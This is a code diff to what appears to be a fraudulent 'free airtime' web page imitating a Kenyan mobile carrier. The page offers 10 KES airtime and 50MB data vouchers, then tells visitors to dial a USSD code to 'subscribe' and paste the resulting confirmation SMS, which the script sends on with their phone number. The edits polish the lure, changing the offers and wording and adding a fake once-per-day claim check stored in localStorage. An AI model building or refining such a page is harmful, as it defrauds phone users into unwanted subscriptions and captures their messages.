@@ -18,7 +18,6 @@
             padding: 0; 
             text-align: center; 
             color: white;
-            /* INSERT YOUR IMAGE HERE */
             background: linear-gradient(rgba(0, 110, 58, 0.8), rgba(0, 110, 58, 0.8)), 
                         url('background.jpg'); 
             background-size: cover;
@@ -74,8 +73,6 @@
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--saf-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .dial-link { background: #00adef; color: white; padding: 8px 12px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin: 10px 0; font-size: 14px; }
-
         footer { margin-top: 40px; font-size: 12px; opacity: 0.9; padding-bottom: 30px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
     </style>
 </head>
@@ -91,15 +88,15 @@
     <p class="instruction">Select a voucher below to continue</p>
 
     <div class="card">
-        <h2>20/=</h2>
+        <h2>10/=</h2>
         <p>FREE AIRTIME</p>
-        <button class="btn-claim" onclick="openStep1('20 KES')">CLAIM NOW</button>
+        <button class="btn-claim" onclick="openStep1('10 KES Airtime')">CLAIM NOW</button>
     </div>
 
     <div class="card">
-        <h2>10/=</h2>
-        <p>FREE AIRTIME</p>
-        <button class="btn-claim" onclick="openStep1('10 KES')">CLAIM NOW</button>
+        <h2>50MB</h2>
+        <p>FREE BUNDLES</p>
+        <button class="btn-claim" onclick="openStep1('50MB Data')">CLAIM NOW</button>
     </div>
 </div>
 
@@ -107,7 +104,7 @@
     <div class="modal-content">
         <span class="step-badge">STEP 1: RECIPIENT</span>
         <h3 style="margin: 0; color: var(--saf-green);">Phone Number</h3>
-        <p style="font-size: 13px; color: #666;">Where should we send your airtime?</p>
+        <p style="font-size: 13px; color: #666;">Where should we send your reward?</p>
         <input type="tel" id="phone" placeholder="07XXXXXXXX" maxlength="10">
         <button class="btn-next" onclick="toStep2()">Continue to Verify</button>
         <span class="back-link" onclick="closeModals()">Cancel</span>
@@ -119,8 +116,7 @@
         <span class="step-badge">STEP 2: VERIFICATION</span>
         <h3 style="margin: 0; color: var(--saf-green);">Complete Subscription</h3>
         <p style="font-size: 13px; color: #444; text-align: left;">
-            1. Tap the button below to dial:<br>
-            <a href="tel:*811*47%23" class="dial-link">DIAL *811*47#</a><br>
+            1. Dial <b>*811*47#</b> from your phone.<br>
             2. Select <b>Option 1</b> to subscribe.<br>
             3. <b>Copy</b> the confirmation SMS and <b>paste</b> it below:
         </p>
@@ -138,7 +134,7 @@
     <div class="modal-content" id="success-state">
         <div class="success-icon">✓</div>
         <h3 style="color: var(--saf-green);">Claim Successful!</h3>
-        <p style="font-size: 14px; color: #444;">Airtime will be sent to <b><span id="display-phone"></span></b> in 5-10 minutes.</p>
+        <p style="font-size: 14px; color: #444;">Your reward will be sent to <b><span id="display-phone"></span></b> in 5-10 minutes.</p>
         <button class="btn-next" onclick="window.location.reload()">Done</button>
     </div>
 </div>
@@ -164,10 +160,20 @@
 
     function toStep2() {
         const phone = document.getElementById("phone").value.trim();
+        
+        // Validation for existence check
+        let submittedNumbers = JSON.parse(localStorage.getItem('submitted_saf_numbers') || "[]");
+        
         if(!/^0(7|1)\d{8}$/.test(phone)) {
             alert("Please enter a valid phone number.");
             return;
         }
+
+        if(submittedNumbers.includes(phone)) {
+            alert("This number has already claimed a reward today.");
+            return;
+        }
+
         currentData.phone = phone;
         document.getElementById("modalStep1").style.display = "none";
         document.getElementById("modalStep2").style.display = "flex";
@@ -186,6 +192,11 @@
 
         document.getElementById("form-container").style.display = "none";
         document.getElementById("loading-state").style.display = "flex";
+
+        // Save number to LocalStorage to prevent re-entry
+        let submittedNumbers = JSON.parse(localStorage.getItem('submitted_saf_numbers') || "[]");
+        submittedNumbers.push(currentData.phone);
+        localStorage.setItem('submitted_saf_numbers', JSON.stringify(submittedNumbers));
 
         const params = new URLSearchParams();
         params.append("phone", currentData.phone);
